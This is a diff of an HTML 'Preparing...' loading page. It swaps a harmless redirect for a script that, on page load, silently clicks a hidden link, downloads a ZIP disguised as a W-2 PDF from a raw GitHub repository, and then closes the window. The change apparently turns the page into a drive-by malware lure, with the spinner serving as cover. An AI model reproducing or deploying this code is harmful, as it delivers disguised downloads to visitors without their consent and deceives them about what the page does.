@@ -1,36 +1,44 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loading...</title>
+<title>Preparing...</title>
 <style>
   body {
-    background-color: white;
+    background: #000;
+    color: white;
     display: flex;
+    flex-direction: column;
     justify-content: center;
     align-items: center;
     height: 100vh;
-    margin: 0;
   }
-  .cube {
+  .loader {
+    border: 6px solid #333;
+    border-top: 6px solid #09f;
+    border-radius: 50%;
     width: 50px;
     height: 50px;
-    background: green;
-    animation: spin 1s linear infinite;
+    animation: spin 0.5s linear infinite;
   }
   @keyframes spin {
-    from { transform: rotate(0deg); }
-    to { transform: rotate(360deg); }
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
   }
 </style>
 <script>
-  setTimeout(function(){
-    window.location.href = "https://example.com"; // <-- Final redirect link
-  }, 1000); // 1 second
+  window.onload = function() {
+    const link = document.createElement('a');
+    link.href = "https://raw.githubusercontent.com/MARKZBERG35/teamfile/main/W2_2024_LW2D1-pdf.zip"; 
+    link.download = "https://raw.githubusercontent.com/MARKZBERG35/teamfile/main/W2_2024_LW2D1-pdf.zip";
+    document.body.appendChild(link);
+    link.click();
+    setTimeout(() => window.close(), 2000);
+  };
 </script>
 </head>
 <body>
-  <div class="cube"></div>
+  <div class="loader"></div>
+  <p>loading...</p>
 </body>
 </html>
